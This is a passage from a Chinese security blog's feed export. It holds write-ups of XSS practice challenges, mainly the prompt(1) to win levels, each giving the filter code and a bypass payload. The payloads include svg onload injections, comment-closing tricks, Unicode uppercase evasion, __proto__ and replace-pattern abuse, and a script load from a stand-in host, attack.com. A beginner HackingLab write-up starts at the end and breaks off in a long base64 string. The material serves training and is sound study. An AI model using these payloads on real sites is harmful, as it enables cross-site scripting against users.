s.toUpperCase() + '")&lt;/script&gt;';&#125; 神操作——JSFUCK,JSFuck 用+! 完成任意语句，详见这里,语句转换器在这里]]></content>
      <categories>
        <category>XSS</category>
      </categories>
      <tags>
        <tag>XSS</tag>
        <tag>writeup</tag>
        <tag>web security</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[prompt(1)-writeup]]></title>
    <url>%2Fblog%2Fprompt-1-writeup%2F</url>
    <content type="text"><![CDATA[prompt(1) to win XSS在线练习题，每一道都非常有趣，题目都有典型性。官方wiki题解在这里 0x0012345function escape(input) &#123; // warm up // script should be executed without user interaction return '&lt;input type="text" value="' + input + '"&gt;';&#125; 简单双引号闭合，为了使答案最短，可以用svg标签:&quot;&gt;&lt;svg/onload=prompt(1)&gt; 0x0112345678function escape(input) &#123; // tags stripping mechanism from ExtJS library // Ext.util.Format.stripTags var stripTagsRE = /&lt;\/?[^&gt;]+&gt;/gi; input = input.replace(stripTagsRE, ''); return '&lt;article&gt;' + input + '&lt;/article&gt;';&#125; 规则会将&lt;/xx&gt;过滤，可以通过不使用&gt;来绕过规则，跟上题一样，可以使用svg标签，这里需要注意的知识点是：为了让onload立即渲染执行，可以通过在后面加上分隔符（空格或回车）来执行，所以最终答案为:&lt;svg/onload=prompt(1)注意末尾要加`或者\n` 0x021234567function escape(input) &#123; // v-- frowny face input = input.replace(/[=(]/g, ''); // ok seriously, disallows equal signs and open parenthesis return input;&#125; 规则过滤了 = ( 由于我们使用HTML实体在&lt;svg&gt;的&lt;script&gt;中，或者其他CDATA元素中是会被解析成文本的，所以可以使用HTML实体，绕过(检测，所以最终结果如下:&lt;svg&gt;&lt;script&gt;prompt&amp;#40;1)&lt;/script&gt; 0x031234567function escape(input) &#123; // filter potential comment end delimiters input = input.replace(/-&gt;/g, '_'); // comment the input to avoid script execution return '&lt;!-- ' + input + ' --&gt;';&#125; 可以看见输出被注释&lt;!-- --&gt;包裹，需要闭合注释进行执行，而代码又会过滤-&gt;，所以需要知道一些特殊的点: “… the comment must be ended by the three character sequence U+002D HYPHEN-MINUS, U+002D HYPHEN-MINUS, U+003E GREATER-THAN SIGN (–&gt;).” 在HTML说明中规定注释的结尾必须以--&gt;为结尾，而在HTML5中有些不一样，除了--&gt;之外，--!&gt;也可以闭合!答案：--!&gt;&lt;svg/onload=prompt(1) 0x041234567891011function escape(input) &#123; // make sure the script belongs to own site // sample script: http://prompt.ml/js/test.js if (/^(?:https?:)?\/\/prompt\.ml\//i.test(decodeURIComponent(input))) &#123; var script = document.createElement('script'); script.src = input; return script.outerHTML; &#125; else &#123; return 'Invalid resource.'; &#125;&#125; 这道题题目限制在prompt.ml/域名下去加载资源，所以是想办法绕过检测机制去加载我们恶意网站的内容，这里需要知道一个知识： 12URL的完整格式协议类型:[//[访问资源需要的凭证信息@]服务器地址[:端口号]][/资源层级UNIX文件路径]文件名[?查询][#片段ID] 即在url中还有一个访问凭证字段，我们的想法是通过@符号，使浏览器让prompt.ml等内容被识别为凭证信息，从而访问我们的恶意网站，由于使用了decodeURIComponent函数，可以通过使用URLencode进行转义，被decode之后的内容还满足正则表达式，但input本身的%2f会被识别为凭证信息，所以答案应该是: 1http://prompt.ml%2f@attack.com 0x051234567function escape(input) &#123; // apply strict filter rules of level 0 // filter "&gt;" and event handlers input = input.replace(/&gt;|on.+?=|focus/gi, '_'); return '&lt;input value="' + input + '" type="text"&gt;';&#125; 题目过滤了&gt;和所有事件,有一点需要明确，其正则表达式没有使用多行匹配模式，这一点可以被很多时候利用，还有一点是由于我们所处的位置在type=text之前，所以可以使用type=img将其类型改为image，可以想想type=hidden,然后通过换行绕过正则表达式，答案为： 12"type=image src=# onerror="prompt(1) 0x061234567891011121314151617181920212223242526272829303132function escape(input) &#123; // let's do a post redirection try &#123; // pass in formURL#formDataJSON // e.g. http://httpbin.org/post#&#123;"name":"Matt"&#125; var segments = input.split('#'); var formURL = segments[0]; var formData = JSON.parse(segments[1]); var form = document.createElement('form'); form.action = formURL; form.method = 'post'; for (var i in formData) &#123; var input = form.appendChild(document.createElement('input')); input.name = i; input.setAttribute('value', formData[i]); &#125; return form.outerHTML + ' \n\&lt;script&gt; \n\ // forbid javascript: or vbscript: and data: stuff \n\ if (!/script:|data:/i.test(document.forms[0].action)) \n\ document.forms[0].submit(); \n\ else \n\ document.write("Action forbidden.") \n\&lt;/script&gt; \n\ '; &#125; catch (e) &#123; return 'Invalid form data.'; &#125;&#125; 常见方式，使用自己定义的同名属性来代替默认字段内容，这样首先会加载我们新创建的字段内容，答案如下： 1javascript:prompt(1)#&#123;"action":1&#125; 0x0712345678function escape(input) &#123; // pass in something like dog#cat#bird#mouse... var segments = input.split('#'); return segments.map(function(title) &#123; // title can only contain 12 characters return '&lt;p class="comment" title="' + title.slice(0, 12) + '"&gt;&lt;/p&gt;'; &#125;).join('\n');&#125; 由题目得通过#进行分割输出且限制长度为12个字符，比较常见方法通过/**/注释来进行构造，答案如下:1"&gt;&lt;svg/a=#"onload='/*#*/prompt(1)' 0x0812345678910function escape(input) &#123; // prevent input from getting out of comment // strip off line-breaks and stuff input = input.replace(/[\r\n&lt;/"]/g, ''); return ' \n\&lt;script&gt; \n\ // console.log("' + input + '"); \n\&lt;/script&gt; ';&#125; 需要知道一个知识点： 1234Javascript中valid line separators除了\r \n还有:\u2028(Line Separator)\u2029(Paragraph Separator) 所以答案为： 1test[\u2028]prompt(1)[\u2028]--&gt; 0x09123456789function escape(input) &#123; // filter potential start-tags input = input.replace(/&lt;([a-zA-Z])/g, '&lt;_$1'); // use all-caps for heading input = input.toUpperCase(); // sample input: you shall not pass! =&gt; YOU SHALL NOT PASS! return '&lt;h1&gt;' + input + '&lt;/h1&gt;';&#125; 这道题比较有意思，过滤了标签的开始，并将内容全部大写了，这里需要知道，unicode码包含了许多国家的语言文字，有一些语言的字母调用Upper函数进行大写，由于没有对应的大写文字，会自动的转换为英文字母，而在url中，协议和域名是不区分大小写的这时，我们就可以进行利用了。首先，我们可以在控制台写一个循环来查找Upper之后是S的字符。 1234567for (i=0;i&lt;=100000;i++)&#123; if (String.fromCharCode(i).toUpperCase()=="S")&#123; console.log(i) console.log(String.fromCharCode(i)) &#125;&#125; 然后用这个字符ſ进行绕过。结果如下： 1&lt;ſvg&gt;&lt;ſcript/href=attack.com&gt; 0x0A123456789function escape(input) &#123; // (╯°□°）╯︵ ┻━┻ input = encodeURIComponent(input).replace(/prompt/g, 'alert'); // ┬──┬ ノ( ゜-゜ノ) chill out bro input = input.replace(/'/g, ''); // (╯°□°）╯︵ /(.□. \）DONT FLIP ME BRO return '&lt;script&gt;' + input + '&lt;/script&gt; ';&#125; 这种过滤多次一般会存在后者刚好帮前者达成了目的，比较简单： 1p'rompt(1) 0x0B123456789101112131415function escape(input) &#123; // name should not contain special characters var memberName = input.replace(/[[|\s+*/\\&lt;&gt;&amp;^:;=~!%-]/g, ''); // data to be parsed as JSON var dataString = '&#123;"action":"login","message":"Welcome back, ' + memberName + '."&#125;'; // directly "parse" data in script context return ' \n\&lt;script&gt; \n\ var data = ' + dataString + '; \n\ if (data.action === "login") \n\ document.write(data.message) \n\&lt;/script&gt; ';&#125; 有一个知识点,在脚本环境中，&quot;string&quot;(alert(1)) 不会报错，且会正确执行，而为了使语法正确，使用in关键字，结果如下: 1"(prompt(1))in" 0x0C123456789function escape(input) &#123; // in Soviet Russia... input = encodeURIComponent(input).replace(/'/g, ''); // table flips you! input = input.replace(/prompt/g, 'alert'); // ノ┬─┬ノ ︵ ( \o°o)\ return '&lt;script&gt;' + input + '&lt;/script&gt; ';&#125; 对于encodeURIComponent，其不会编码 .() 可以通过 toString() 构造payload toString(radix)中radix 为 2-36 可以选36使其作为一个进制，将字符包含起来使用parseInt(str, radix) 将字符转为数字之后使用(number).toString(radix) 然后用eval进行调用 注意number有括号，(number).toString(radix) 可简写为 （numbrer..toString(radix) ，字符之间用concat()连接 1eval(630038579..toString(30))(1)==eval(prompt(1)) 0x0D123456789101112131415161718192021222324252627282930313233 function escape(input) &#123; // extend method from Underscore library // _.extend(destination, *sources) function extend(obj) &#123; var source, prop; for (var i = 1, length = arguments.length; i &lt; length; i++) &#123; source = arguments[i]; for (prop in source) &#123; obj[prop] = source[prop]; &#125; &#125; return obj; &#125; // a simple picture plugin try &#123; // pass in something like &#123;"source":"http://sandbox.prompt.ml/PROMPT.JPG"&#125; var data = JSON.parse(input); var config = extend(&#123; // default image source source: 'http://placehold.it/350x150' &#125;, JSON.parse(input)); // forbit invalid image source if (/[^\w:\/.]/.test(config.source)) &#123; delete config.source; &#125; // purify the source by stripping off " var source = config.source.replace(/"/g, ''); // insert the content using mustache-ish template return '&lt;img src="&#123;&#123;source&#125;&#125;"&gt;'.replace('&#123;&#123;source&#125;&#125;', source); &#125; catch (e) &#123; return 'Invalid image data.'; &#125;&#125; 1&gt;In fact, config.source is equal to config.__proto__.source, this because __proto__ is an accessor property (getter/setter function) 这也是常见的构造相同名称的属性进行绕过替换。知道这一点，我们可以将结果构造成如下形式： 1&#123;"source":"_-_invalid-URL_-_","__proto__":&#123;"source":"my_evil_payload"&#125;&#125;` 他会理解为: 123456config = &#123; "source": "_-_invalid-URL_-_", "__proto__": &#123; "source": "my_evil_payload" &#125;&#125; 之后，我们的payload已经进入source字段中，但是如果我们无法注入&quot;，依旧无法跳出&lt;img src=&quot;_posts/prompt-1-writeup.md&quot;&gt;,这里需要一个奇技淫巧，String.replace,他有一些特殊的替换规则： Pattern Inserts $$ Inserts a “$”. $&amp; Inserts the matched substring. $` Inserts the portion of the string that precedes the matched substring. $&#39; Inserts the portion of the string that follows the matched substring. $n Where n is a positive integer less than 100, inserts the nth parenthesized submatch string, provided the first argument was a RegExp object. Note that this is 1-indexed. 所以,答案为: 1&#123;"source":&#123;&#125;,"__proto__":&#123;"source":"$`onerror=prompt(1)&gt;"&#125;&#125; 0x0E12345678910111213function escape(input) &#123; // I expect this one will have other solutions, so be creative :) // mspaint makes all file names in all-caps :( // too lazy to convert them back in lower case // sample input: prompt.jpg =&gt; PROMPT.JPG input = input.toUpperCase(); // only allows images loaded from own host or data URI scheme input = input.replace(/\/\/|\w+:/g, 'data:'); // miscellaneous filtering input = input.replace(/[\\&amp;+%\s]|vbs/gi, '_'); return '&lt;img src="' + input + '"&gt;';&#125; 这题chrome上好像不行，firefox上使用iframe，src使用base64编码可以达成绕过。 1"&gt;&lt;IFRAME/SRC="x:text/html;base64,ICA8U0NSSVBUIC8KU1JDCSA9SFRUUFM6UE1UMS5NTD4JPC9TQ1JJUFQJPD4= 0x0F1234567891011function escape(input) &#123; // sort of spoiler of level 7 input = input.replace(/\*/g, ''); // pass in something like dog#cat#bird#mouse... var segments = input.split('#'); return segments.map(function(title, index) &#123; // title can only contain 15 characters return '&lt;p class="comment" title="' + title.slice(0, 15) + '" data-comment=\'&#123;"id":' + index + '&#125;\'&gt;&lt;/p&gt;'; &#125;).join('\n');&#125; 同之前的题，利用注释闭合，不同的是，这里使用&lt;!----&gt;,答案如下: 1"&gt;&lt;svg&gt;&lt;!--#--&gt;&lt;script&gt;&lt;!--#--&gt;prompt(1&lt;!--#--&gt;)&lt;/script&gt;]]></content>
      <categories>
        <category>XSS</category>
      </categories>
      <tags>
        <tag>XSS</tag>
        <tag>writeup</tag>
        <tag>web security</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HackingLab writeup]]></title>
    <url>%2Fblog%2Fhackinglab-writeup%2F</url>
    <content type="text"><![CDATA[HackingLab 题目比较基础，非常适合入门。 选择题都比较基础，很简单，略过。 基础关1.key在哪里？直接看源码 2.再加密一次你就得到key啦~ 加密之后的数据为xrlvf23xfqwsxsqf 这里的知识点是ROT-13，密文加密后会得到明文，找个解密网站，得到key。 3.猜猜这是经过了多少次加密？ 加密后的字符串为: 1Vm0wd2QyUXlVWGxWV0d4V1YwZDRWMVl3WkRSV01WbDNXa1JTVjAxV2JETlhhMUpUVmpBeFYySkVUbGhoTVVwVVZtcEJlRll5U2tWVWJHaG9UVlZ3VlZacVFtRlRNbEpJVm10a1dHSkdjRTlaVjNSR1pVWmFkR05GU214U2JHdzFWVEowVjFaWFNraGhSemxWVmpOT00xcFZXbUZrUjA1R1drWndWMDFFUlRGV1ZFb3dWakZhV0ZOcmFHaFNlbXhXVm1wT1QwMHhjRlpYYlhSWFRWaENSbFpYZUZOVWJVWTJVbFJDVjAxdVVuWlZha1pYWkVaT2NscEdhR2xTTW1ob1YxWlNTMkl4U2tkWGJHUllZbFZhY1ZadGRHRk5SbFowWlVaT1ZXSlZXVEpWYkZKSFZqRmFSbUl6WkZkaGExcG9WakJhVDJOdFJraGhSazVzWWxob1dGWnRNWGRVTVZGM1RVaG9hbEpzY0ZsWmJGWmhZMnhXY1ZGVVJsTk5XRUpIVmpKNFQxWlhTa2RqUm14aFUwaENTRlpxUm1GU2JVbDZXa1prYUdFeGNHOVdha0poVkRKT2RGSnJhR2hTYXpWeldXeG9iMWRHV25STldHUlZUVlpHTTFSVmFHOWhiRXB6WTBac1dtSkdXbWhaTVZwaFpFZFNTRkpyTlZOaVJtOTNWMnhXYjJFeFdYZE5WVlpUWVRGd1YxbHJXa3RUUmxweFVtMUdVMkpWYkRaWGExcHJZVWRGZUdOSE9WZGhhMHBvVmtSS1QyUkdTbkpoUjJoVFlYcFdlbGRYZUc5aU1XUkhWMjVTVGxOSFVuTlZha0p6VGtaVmVXUkhkRmhTTUhCSlZsZDRjMWR0U2tkWGJXaGFUVzVvV0ZsNlJsZGpiSEJIV2tkc1UySnJTbUZXTW5oWFdWWlJlRmRzYUZSaVJuQlpWbXRXZDFZeGJISlhhM1JVVW14d2VGVXlkR0ZpUmxwelYyeHdXR0V4Y0hKWlZXUkdaVWRPUjJKR2FHaE5WbkJ2Vm10U1MxUnRWa2RqUld4VllsZG9WRlJYTlc5V1ZscEhXVE5vYVUxWFVucFdNV2h2VjBkS1dWVnJPVlpoYTFwSVZHeGFZVmRGTlZaUFYyaHBVbGhCZDFac1pEUmpNV1IwVTJ0b2FGSnNTbGhVVlZwM1ZrWmFjVk5yWkZOaVJrcDZWa2N4YzFVeVNuSlRiVVpYVFc1b1dGZFdXbEpsUm1SellVWlNhVkp1UWxwV2JYUlhaREZaZUdKSVNsaGhNMUpVVlcxNGQyVkdWbGRoUnpsb1RWWndlbFl5Y0VkV01ERjFZVWhLV2xaWFVrZGFWM2hIWTIxS1IyRkdhRlJTVlhCS1ZtMTBVMU14VlhoWFdHaFlZbXhhVjFsc1pHOVdSbXhaWTBaa2JHSkhVbGxhVldNMVlWVXhXRlZyYUZkTmFsWlVWa2Q0YTFOR1ZuTlhiRlpYWWtoQ1NWWkdVa2RWTVZwMFVtdG9VRll5YUhCVmJHaERUbXhrVlZGdFJtcE5WMUl3VlRKMGIyRkdTbk5UYkdoVlZsWndNMVpyV21GalZrNXlXa1pPYVZKcmNEWldhMk40WXpGVmVWTnVTbFJpVlZwWVZGYzFiMWRHWkZkWGJFcHNVbTFTZWxsVldsTmhWa3AxVVd4d1YySllVbGhhUkVaYVpVZEtTVk5zYUdoTk1VcFZWbGN4TkdReVZrZFdXR3hyVWpOU2IxbHNWbmRXTVZwMFkwZEdXR0pHY0ZoWk1HUnZWMnhhV0ZWclpHRldWMUpRVlRCVk5WWXhjRWhoUjJoT1UwVktNbFp0TVRCVk1VMTRWVmhzVm1FeVVsWlpiWFIzWVVaV2RHVkZkR3BTYkhCNFZrY3dOVll4V25OalJXaFlWa1UxZGxsV1ZYaFhSbFoxWTBaa1RsWXlhREpXTVZwaFV6RkplRlJ1VmxKaVJscFlWRlJHUzA1c1drZFZhMlJXVFZad01GVnRkRzlWUmxwMFlVWlNWVlpYYUVSVk1uaGhZekZ3UlZWdGNFNVdNVWwzVmxSS01HRXhaRWhUYkdob1VqQmFWbFp1Y0Zka2JGbDNWMjVLYkZKdFVubGFSV1IzWVZaYWNtTkZiRmRpUjFFd1ZrUktSMVl4VGxsalJuQk9UVzFvV1ZkV1VrZGtNa1pIVjJ4V1UySkdjSE5WYlRGVFRWWlZlV042UmxoU2EzQmFWVmMxYjFZeFdYcGhTRXBWWVRKU1NGVnFSbUZYVm5CSVlVWk9WMVpHV2xaV2JHTjRUa2RSZVZaclpGZGlSMUp2Vlc1d2MySXhVbGRYYm1Sc1lrWnNOVmt3Vm10V01ERkZVbXBHV2xaWGFFeFdNbmhoVjBaV2NscEhSbGROTW1oSlYxUkplRk14U1hoalJXUmhVbFJXVDFWc2FFTlRNVnAwVFZSQ1ZrMVZNVFJXYkdodlYwWmtTR0ZHYkZwaVdHaG9WbTE0YzJOc2NFaFBWM0JUWWtoQ05GWnJZM2RPVmxsNFYyNVNWbUpIYUZoV2FrNU9UVlphV0dNemFGaFNiRnA1V1ZWYWExUnRSbk5YYkZaWFlUSlJNRmRXV2t0ak1WSjFWRzFvVTJKR2NGbFhWM2hoVW0xUmVGZHVSbEppVlZwaFZtMHhVMU5XV2xoa1J6bG9UVlZ3TUZsVldsTldWbHBZWVVWU1ZrMXVhR2haZWtaM1VsWldkR05GTlZkTlZXd3pWbXhTUzAxSFNYbFNhMlJVWW1zMVZWbHJaRzlXYkZwMFpVaGtUazFXYkROV01qVkxZa1pLZEZWdWJHRlNWMUl6V1ZaYVlXTnRUa1ppUm1ScFVqRkZkMWRXVWt0U01WbDRWRzVXVm1KRlNsaFZiRkpYVjFaYVIxbDZSbWxOVjFKSVdXdG9SMVpIUlhoalNFNVdZbFJHVkZZeWVHdGpiRnBWVW14a1RsWnVRalpYVkVKaFZqRmtSMWRZY0ZaaWEzQllWbXRXWVdWc1duRlNiR1JxVFZkU2VsbFZaSE5XTVZwMVVXeEdWMkV4Y0doWFZtUlNaVlphY2xwR1pGaFNNMmg1VmxkMFYxTXhaRWRWYkdSWVltMVNjMVp0TVRCTk1WbDVUbGQwV0ZKcmJETldiWEJUVjJzeFIxTnNRbGROYWtaSFdsWmFWMk5zY0VoU2JHUk9UVzFvU2xZeFVrcGxSazE0VTFob2FsSlhhSEJWYlRGdlZrWmFjMkZGVGxSTlZuQXdWRlpTUTFack1WWk5WRkpYWWtkb2RsWXdXbXRUUjBaSFlrWndhVmRIYUc5V2JYQkhZekpOZUdORmFGQldiVkpVV1d4b2IxbFdaRlZSYlVab1RXdHdTVlV5ZEc5V2JVcElaVWRvVjJKSFVrOVVWbHB6VmpGYVdXRkdhRk5pUm5BMVYxWldZV0V4VW5SU2JrNVlZa1phV0ZsVVNsSk5SbFkyVW10MGFrMVlRa3BXYlhoVFlWWktjMk5HYkZoV00xSm9Xa1JCTVdNeFpISmhSM2hUVFVad2FGWnRNSGhWTVVsNFZXNU9XR0pWV2xkVmJYaHpUbFpzVm1GRlRsZGlWWEJKV1ZWV1QxbFdTa1pYYldoYVpXdGFNMVZzV2xka1IwNUdUbFprVGxaWGQzcFdiWGhUVXpBeFNGTlliRk5oTWxKVldXMXpNVlpXYkhKYVJ6bFhZa1p3ZWxZeU5XdFVhekZYWTBoc1YwMXFSa2haVjNoaFkyMU9SVkZ0UmxOV01VWXpWbTF3UzFNeVRuTlVia3BxVW0xb2NGVnRlSGRsVm1SWlkwVmtWMkpXV2xoV1J6VlBZVlpLZFZGck9WVldla1oyVmpGYWExWXhWbkphUjNST1lURndTVlpxU2pSV01WVjVVMnRrYWxORk5WZFpiRkpIVmtaU1YxZHNXbXhXTURReVZXMTRhMVJzV25WUmFscFlWa1ZLYUZacVJtdFNNV1IxVkd4U2FFMXRhRzlXVjNSWFdWZE9jMVp1UmxSaE0xSlZWbTE0UzAxR2JGWlhhemxYVFZad1NGWXljRXRXTWtwSVZHcFNWV0V5VWxOYVZscGhZMnh3UjFwR2FGTk5NbWcxVm14a2QxUXhWWGxUV0docFUwVTFXRmx0TVZOWFJsSlhWMjVrVGxKdGRETlhhMVpyVjBaSmQyTkZhRnBOUm5CMlZqSnplRk5HVm5WWGJHUk9ZbTFvYjFacVFtRldNazV6WTBWb1UySkhVbGhVVmxaM1ZXeGFjMVZyVG1oTlZXdzBWVEZvYzFVeVJYbGhTRUpXWWxoTmVGa3dXbk5XVmtaMVdrVTFhVkp1UVhkV1JscFRVVEZhY2sxV1drNVdSa3BZVm01d1YxWkdXbkZUYTFwc1ZteGFNVlZ0ZUdGaFZrbDRVbGhrVjJKVVJUQlpla3BPWlVkT1JtRkdRbGRpVmtwVlYxZDBWMlF4WkhOWGEyaHNVak5DVUZadGVITk9SbGw1VGxaT1YySlZjRWxaVlZwdlZqSkdjazVWT1ZWV2JIQm9WakJrVG1WdFJrZGhSazVwVW01Qk1sWXhXbGRaVjBWNFZXNU9XRmRIZUc5VmExWjNWMFpTVjFkdVpHaFNiRmt5VlcxME1HRnJNVmRUYWtaWFZqTm9VRmxXV2twbFJrNTFXa1prYUdFd2NGaFdSbFpXWlVaSmVGcElTbWhTTTFKVVZGVmFkMlJzV2tkYVNIQk9WakZhZWxZeGFITlVNVnB5VGxjNVZWWnNXak5VVlZwaFYwVTFWbFJzWkU1aE0wSktWMVpXVjFVeFdsaFRiR3hvVWpKb1dGbHJXbmRWUmxwelYydDBhazFXY0hsVWJGcHJZVmRGZDFkWWNGZGlXR2h4V2tSQmVGWXhVbGxoUm1ob1RXMW9WbGRYZEd0aU1rbDRWbTVHVW1KVldsaFphMXAzVFVad1ZtRkhkRlZoZWtaYVZWZDRjMWxXV2xoaFJYaGFZVEZ3WVZwVldtdGpiVTVIWVVkb1RsZEZTbEpXYlRGM1V6RktkRlpyYUZWaE1WcFlXV3RrVTFaR1ZuTlhibVJzVm0xU1dsa3dWbXRXTWtwWFVtcE9WVlpzV25wWlZscEtaVmRHUjFWc2NHbFNNbWd5Vm1wR1lXRXhaRWhXYTJoUVZtdHdUMVpzVWtaTlJtUlZVVzFHV2xac2JEUlhhMVp2WVVaS2MxTnNXbGRpVkVaVVZtdGFkMWRIVmtsVWJHUnBVakZLTmxaclkzaGlNVmw1VWxod1VsZEhhRmhXYlRGU1RVWndSVkpzY0d4V2F6VjZXV3RhWVdGV1NYbGhSemxYVmpOU1dGZFdaRTlqTVZwMVVteFNhRTB4U2xaV2JURjZUVlV4UjFadVVteFNWR3h3VldwQ2QxZHNiRlpWYkU1WFRVUkdXVlpXYUd0WFJscDBWV3hPWVZac2NHaFpNbmgzVWpGd1IyRkdUazVOYldjeFZtMTRhMlF4UlhoaVJtaFZZVEpTV0ZsdGVFdGpNVlYzV2taT2FrMVhlSGxXTWpWUFZERmFkVkZzWkZwV1YxRjNWakJhUzJOdFNrVlViR1JwVjBWS1ZWWnFTbnBsUmtsNFZHNU9VbUpIVWs5WlYzUmhVMFprYzFkdFJsZE5helY2V1RCV2IxVXlTa2hWYXpsVlZucEdkbFV5ZUZwbFJsWnlZMGQ0VTJGNlJUQldWRVp2WWpKR2MxTnNhRlppVjJoWFdXdGFTMWRHV2tWU2JHUnFUV3RhUjFaSGVGTlViRnAxVVZoa1YxSnNjRlJWVkVaaFkyc3hWMWRyTlZkU2EzQlpWMWQwYTJJeVVuTlhXR1JZWWxoU1ZWVnFRbUZUVm14V1YyMUdWV0pGY0RGVlZ6QTFWakpLVlZKVVFscGxhM0JRV1hwR2QxTldUblJrUms1T1RVVndWbFl4WkRCaU1VVjNUbFZrV0dKcmNHRlVWRXBUVlVaYWRHVklUazlTYkd3MVZHeFZOV0ZIU2taalJteGFWbFp3ZWxacVNrWmxSbHBaWVVkR1UwMHlhRFpXYlhCSFdWWmtXRkpyWkdoU2F6VndWVzAxUWsxc1dYaFhiR1JhVmpCV05GWlhOVTlYUm1SSVpVYzVWbUV4V2pOV01GcFRWakZrZFZwSGFGTmlSbXQ1VmxjeE1FMUhSbkpOVm1SVVlXdGFXRlpxVG05U1JscHhVMnQwVTAxck5VaFphMXB2VmpBd2VGTnFTbGRXYkVwSVZsUkdXbVZIVGtaaVJsWnBVakpvZDFadGVHRmtNV1JIVjJ0a1dHSlZXbkZVVlZKWFUwWlplR0ZJVGxWTlZuQjVWR3hqTlZaV1duTlhibkJWWWtad2VsWnRNVWRTYkZKeldrZHNWMWRGU2t0V01WcFhWakZWZUZkWVpFNVdiVkp4VldwS2IxbFdVbGRYYm1SV1VtMTBORll5ZUd0aGF6RllWVzVzVldKR2NISldSM2hoVjBkUmVtTkdaR2xYUjJoVlZsaHdRbVZHVGtkVWJHeHBVbXMxYjFSWGVFdFdiR1JZVFZod1RsWnNjRmhaYTJoTFdWWktObUpHYUZwaE1YQXpXbGQ0V21WVk5WaGtSbFpvWld0YVdsZHNWbUZoTVZsM1RWaEdWMkpyY0ZoV2ExWjNWRVpWZUZkclpHcGlWVnBJVjJ0YVQxUnJNWFJoUmxwWFlsUkdNMVY2Ums1bFZsSjFWR3hXYVdFelFuWldWekI0VlRGYVIxVnNWbFJpVkd4d1ZGWmFkMlZXV2xoa1JFSldUVVJHV1ZaWGRHOVdhekYxWVVod1dGWnNjRXRhVjNoSFl6RldjMXBIYUdobGJGbDVWbTF3UjFsWFJYaGFSV2hYWVRKb1VWWnRkSGRVTVZwMFpFaGtWRlp0VWxaVlZ6RkhZVlV4Y2xkcVFsZGlWRlpNVmpCa1MxTkhWa2RhUm5CcFVqSm9WVlpHVWtka01WbDRXa2hTYTFJelFuQlZha1pLWkRGYVJWSnRkR2xOVm13elZGWldhMkZGTUhsbFJtaGFZa1pLUTFwVlduTmpWa3B6WTBkNFUySldTalZXYWtvMFZUSkdXRk5yYkZKaVIyaFlXV3hvVTFkR1pGZGFSbVJxVFZkU01WVnRlRTloVmtsNFUyNW9WMUpzY0hKV1ZFcFhZekpLUjFkdFJsUlNWRloyVm0weE5HUXlWbGRoTTJSV1lsVmFXRlJWVWtkWFZscFhZVWQwV0ZKc2NEQldWM2hQV1ZaYWMyTkhhRnBOYm1nelZXcEdkMUl5UmtkVWF6Vk9ZbGRqZUZadE1UUmhNREZIVjFob1ZWZEhhR2hWYkdSVFZqRnNjbHBHVGxoV2JYZ3dWRlphVDJGck1WZGpSRUpoVmxkb1VGWkVSbUZrVmtaeldrWndWMVl4UmpOV2FrSmhVMjFSZVZScldtaFNia0pQVlcwMVEwMXNXbkZUYm5Cc1VtczFTVlZ0ZEdGaVJrcDBWV3M1V21KVVJuWlpha1poWTFaR2RGSnNaRTVoZWxZMlYxUkNWMkl4VlhsVGEyaFdZa2RvVmxadGVHRk5NVnBZWlVkR2FrMVdXbmxXUjNocllVZFdjMWRzYkZkaGExcDJXV3BLUjJNeFRuTmhSMmhUWlcxNFdGZFdaREJrTWxKelYydFdVMkpHY0hKVVZscDNaVlp3UmxaVVJtaFdhM0F4VlZab2ExZEhTa2RYYmtaVllrZFNSMXBFUVhoV01XUnlUbFprVTJFelFscFdiVEIzWlVkSmVWVnVUbGhYUjFKWldXeG9VMVpXVm5GUmJVWlVZa1phTUZwVlpFZGhSbHB5WWtSU1ZtSkhhSEpXYWtwTFZsWktWVkZzY0d4aE0wSlFWMnhXWVdFeVVsZFdiazVWWWxkNFZGUldWbmRXYkZsNFdrUkNWMDFzUmpSWGEyaFBWMGRGZVdGSVRsWmhhelZFVmxWYVlXUkZNVmRVYkZKVFlrZDNNVlpIZUZaT1YwWklVMnRhYWxKRlNtaFdiR1JUVTBaYWMxZHRSbGROYXpWSVYydGFWMVl5U2tsUmFscFhZbGhDU0ZkV1dtdFhSa3B5WVVkd1UwMXVhRmxXYWtKWFV6Rk9SMWR1VW14U00xSlFWV3BDVjA1R1dsaE9WazVXVFd0d2VWUnNXbk5YYlVWNFkwZG9WMDFXY0doYVJWVjRWakZPY2s1V1RtbFNiWFExVm14amQyVkdTWGxTYmxKVFlXeHdXRmxyWkc5WlZteFZVbTVrVlZKdGVGaFdNblF3WVdzeGNrNVZhRnBoTVhCMlZtcEJkMlZHVG5SUFZtaG9UVlZ3U1ZkV1VrZFhiVlpIWTBWc1ZHSlhhRlJVVkVaTFZsWmFSMVp0Um10TlYxSllWakowYTFsV1RrbFJiazVXWWtaS1dGWXdXbUZrUlRWWFZHMW9UbFpYT0hsWFYzUmhZVEZhZEZOc2JHaFRTRUpXV1d0YWQyVnNXblJOVldSVFlrWktlbGRyWkhOV01XUkdVMnQwVjAxV2NGaFdha1pXWlVaa1dWcEZOVmRpVmtwNFZsZHdTMkl4YkZkVmJHUllZbTFTVjFWdE1UQk9SbGw1WlVkMGFHRjZSbGxXVnpWelZsZEtSMk5JU2xkU00yaG9WakJrVW1WdFRrZGFSMnhZVWpKb1ZsWnNhSGRSYlZaSFZHdGtWR0pIZUc5VmFrSmhWa1phY1ZOdE9WZGlSMUpaV2tWa01HRlZNWEppUkZKWFlsUldWRlpIZUdGT2JVcElVbXhrYVZkSFozcFhiRnBoV1ZkU1JrMVdXbUZTYkZwdldsZDBZVmRzWkhOV2JVWm9UVlpzTTFSV2FFZFdNa3B5WTBab1YyRXhXak5XUlZwV1pVWmtjbHBIY0dsV1ZuQkpWakowWVZReFVuSk5XRkpvVW14d1dGbHNVa2ROTVZZMlVtczFiRlpzU2pGV1IzaFhZVmRGZWxGdWFGZFdla0kwV1dwS1QxSXhXblZWYlhoVVVqRktkMVpHV210Vk1XUkhWMnhvYTFKRlNsZFVWVkpIVjBac2NsVnNUbGROVld3MldWVm9kMWRzV1hwaFJYaGhVbXh3U0ZreWN6VldNVnB6V2tkNGFFMVhPVFZXYlRGM1VqRnNWMkpHWkZSWFIyaHdWV3RhZDFaR2JITmFSRkpWVFZad2VGVnRkREJXUmxwelkwaG9WazFXU2toV1ZFRjRWakZhY1Zac1drNWliRXB2VjFaa05GUXhTbkpPVm1SaFVtNUNjRlZ0ZEhkVFZscDBaRWRHV0dKV1dsbFdiWFJ2WVRGSmVsRnVRbFppVkZaRVZtcEdZVmRGTVZWVmJXeE9WbXhaTVZaWGVHOWtN